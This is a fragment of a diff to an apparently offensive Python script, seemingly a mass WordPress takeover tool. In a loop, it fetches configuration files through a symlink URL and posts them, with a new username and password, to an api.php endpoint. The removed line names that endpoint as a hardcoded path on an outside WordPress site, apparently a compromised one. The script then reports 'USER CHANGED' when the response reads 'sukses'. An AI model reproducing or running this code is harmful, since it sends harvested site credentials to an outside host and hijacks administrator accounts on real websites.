@@ -26,7 +26,7 @@ for i in list:
 		print("["+i+"]"),
 		conf = requests.get(urlsym+i).text
 		data = {"user_baru":user,"pass_baru":pwd,"config":conf,"hajar":"hajar"}
-		text = requests.post("http://purespirit.com.ar/wp-content/upgrade/api.php", data=data, headers=head, verify=False, timeout=mati).text
+		text = requests.post(api, data=data, headers=head, verify=False, timeout=mati).text
 		if "color=lime>sukses" in text:
 			print("[USER CHANGED]"),
 			ua = "./Xi4u7 Tools 8/0"
